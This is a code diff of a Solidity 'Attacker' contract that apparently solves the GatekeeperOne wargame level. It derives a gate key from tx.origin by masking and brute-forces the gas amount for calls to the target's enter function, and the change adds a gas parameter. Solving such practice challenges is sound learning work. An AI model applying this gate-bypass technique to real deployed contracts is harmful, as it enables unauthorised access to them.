@@ -9,7 +9,7 @@ contract Attacker {
     bytes8 key;
     uint256 public $gas;
 
-    constructor(GatekeeperOne _target) {
+    constructor(GatekeeperOne _target, uint256 _gas) {
         target = _target;
         // We are using an 8-byte key, so suppose the key is `ABCD` where each letter is 2 bytes (16 bits).
         //
@@ -20,10 +20,12 @@ contract Attacker {
         // Masking our key with 0xFFFF_FFFF_0000_FFFF should do the trick too.
         key = bytes8(bytes.concat(hex"00000001", hex"0000", bytes2(uint16(uint160(tx.origin)))));
 
-        // TODO: can we find gas in a better way?
         // loop to get the right gas amount
-        for (int256 i = 0; i <= 8191; i++) {
-            uint256 gas = uint256(30000 - i);
+        // saves the correct gas on storage, so you can run it once to find the
+        // correct amount, and run with that amount later
+        for (uint256 i = 0; i <= 8191; i++) {
+            uint256 gas = _gas - i;
+
             try target.enter{gas: gas}(key) {
                 $gas = gas;
                 break;
